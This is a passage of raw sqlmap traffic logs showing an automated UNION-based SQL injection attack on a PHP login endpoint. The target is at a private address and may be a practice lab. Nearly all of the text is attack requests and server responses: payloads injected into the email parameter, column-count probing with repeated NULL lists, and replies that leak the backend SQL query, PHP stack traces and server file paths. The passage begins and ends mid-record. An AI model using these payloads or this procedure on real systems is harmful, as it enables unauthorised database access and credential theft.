User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:26] [TRAFFIC IN] HTTP response [#93] (200 OK):
Date: Sun, 19 Oct 2025 07:42:26 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 189
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-2120%27%20UNION%20ALL%20SELECT%20CONCAT%280x7176766b71%2C0x4f48674145486f685878%2C0x7176766b71%29%2C67%2C67%2C67--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-2120' UNION ALL SELECT CONCAT(0x7176766b71,0x4f48674145486f685878,0x7176766b71),67,67,67-- -'"
    ]
}
[03:42:26] [PAYLOAD] -5028' UNION ALL SELECT 67,67,CONCAT(0x7176766b71,0x5a7371726a714a554954,0x7176766b71),67-- -
[03:42:26] [TRAFFIC OUT] HTTP request [#94]:
GET /ai/includes/user_login.php?email=-5028%27%20UNION%20ALL%20SELECT%2067%2C67%2CCONCAT%280x7176766b71%2C0x5a7371726a714a554954%2C0x7176766b71%29%2C67--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:26] [TRAFFIC IN] HTTP response [#94] (200 OK):
Date: Sun, 19 Oct 2025 07:42:26 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 189
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-5028%27%20UNION%20ALL%20SELECT%2067%2C67%2CCONCAT%280x7176766b71%2C0x5a7371726a714a554954%2C0x7176766b71%29%2C67--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-5028' UNION ALL SELECT 67,67,CONCAT(0x7176766b71,0x5a7371726a714a554954,0x7176766b71),67-- -'"
    ]
}
[03:42:26] [PAYLOAD] -3401' UNION ALL SELECT 67,CONCAT(0x7176766b71,0x78627974744e4a754367,0x7176766b71),67,67-- -
[03:42:26] [TRAFFIC OUT] HTTP request [#95]:
GET /ai/includes/user_login.php?email=-3401%27%20UNION%20ALL%20SELECT%2067%2CCONCAT%280x7176766b71%2C0x78627974744e4a754367%2C0x7176766b71%29%2C67%2C67--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:26] [TRAFFIC IN] HTTP response [#95] (200 OK):
Date: Sun, 19 Oct 2025 07:42:26 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 189
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=-3401%27%20UNION%20ALL%20SELECT%2067%2CCONCAT%280x7176766b71%2C0x78627974744e4a754367%2C0x7176766b71%29%2C67%2C67--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = '-3401' UNION ALL SELECT 67,CONCAT(0x7176766b71,0x78627974744e4a754367,0x7176766b71),67,67-- -'"
    ]
}
[03:42:26] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[03:42:26] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL-- -
[03:42:26] [TRAFFIC OUT] HTTP request [#96]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:26] [TRAFFIC IN] HTTP response [#96] (200 OK):
Date: Sun, 19 Oct 2025 07:42:26 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=um9hf0r7g0n083jejlbf8a3j3j; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:26] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL-- -
[03:42:26] [TRAFFIC OUT] HTTP request [#97]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:26] [TRAFFIC IN] HTTP response [#97] (200 OK):
Date: Sun, 19 Oct 2025 07:42:26 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=urlk7dnrkd6onoti02q2qpu2cs; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:26] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,NULL-- -
[03:42:26] [TRAFFIC OUT] HTTP request [#98]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:26] [TRAFFIC IN] HTTP response [#98] (200 OK):
Date: Sun, 19 Oct 2025 07:42:26 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=v8mfi3ubv505uccps9iidi80iq; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:26] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,NULL-- -
[03:42:26] [TRAFFIC OUT] HTTP request [#99]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:26] [TRAFFIC IN] HTTP response [#99] (200 OK):
Date: Sun, 19 Oct 2025 07:42:26 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 153
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20-&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,NULL-- -'"
    ]
}
[03:42:26] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -
[03:42:26] [TRAFFIC OUT] HTTP request [#100]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:27] [TRAFFIC IN] HTTP response [#100] (200 OK):
Date: Sun, 19 Oct 2025 07:42:26 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=8qudiq1u4f54kl0hadhugkao8l; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:27] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -
[03:42:27] [TRAFFIC OUT] HTTP request [#101]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:27] [TRAFFIC IN] HTTP response [#101] (200 OK):
Date: Sun, 19 Oct 2025 07:42:27 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=om3ps9b8eorlgbqignodhmnddt; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:27] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
[03:42:27] [TRAFFIC OUT] HTTP request [#102]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:27] [TRAFFIC IN] HTTP response [#102] (200 OK):
Date: Sun, 19 Oct 2025 07:42:27 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=hl8vuc9k23i0n11bhhu4lj4t04; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:27] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
[03:42:27] [TRAFFIC OUT] HTTP request [#103]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:27] [TRAFFIC IN] HTTP response [#103] (200 OK):
Date: Sun, 19 Oct 2025 07:42:27 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=rjrrbi4nkls69bi23fgguro6e9; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:27] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
[03:42:27] [TRAFFIC OUT] HTTP request [#104]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:27] [TRAFFIC IN] HTTP response [#104] (200 OK):
Date: Sun, 19 Oct 2025 07:42:27 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=923a1kjes8hj1es9re2lfhmg9h; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:27] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
[03:42:27] [TRAFFIC OUT] HTTP request [#105]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:27] [TRAFFIC IN] HTTP response [#105] (200 OK):
Date: Sun, 19 Oct 2025 07:42:27 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=fhqf0uedmpbig6o1juv0nl1u9h; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:27] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
[03:42:27] [TRAFFIC OUT] HTTP request [#106]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:27] [TRAFFIC IN] HTTP response [#106] (200 OK):
Date: Sun, 19 Oct 2025 07:42:27 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=me07e5trb9n53pvu7itl6sc1pe; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:27] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
[03:42:27] [TRAFFIC OUT] HTTP request [#107]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:27] [TRAFFIC IN] HTTP response [#107] (200 OK):
Date: Sun, 19 Oct 2025 07:42:27 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=hdpcgrspmqboq3eu68he6r9iqj; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:27] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
[03:42:27] [TRAFFIC OUT] HTTP request [#108]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:28] [TRAFFIC IN] HTTP response [#108] (200 OK):
Date: Sun, 19 Oct 2025 07:42:27 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=jolh46ln87ikt7nlqcluu94cpc; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:28] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
[03:42:28] [TRAFFIC OUT] HTTP request [#109]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:28] [TRAFFIC IN] HTTP response [#109] (200 OK):
Date: Sun, 19 Oct 2025 07:42:28 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=7d03uie8tbhjc5k3m7tv5qcim6; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:28] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
[03:42:28] [TRAFFIC OUT] HTTP request [#110]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:28] [TRAFFIC IN] HTTP response [#110] (200 OK):
Date: Sun, 19 Oct 2025 07:42:28 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=br8son6r4rghj3m94gsmr1iuqf; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:42:28] [PAYLOAD] test@chatai.com' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
[03:42:28] [TRAFFIC OUT] HTTP request [#111]:
GET /ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:42:28] [TRAFFIC IN] HTTP response [#111] (200 OK):
Date: Sun, 19 Oct 2025 07:42:28 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=t7cq4qgefl4d65n1m7o6p8jc3b; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-&password=123

<br />
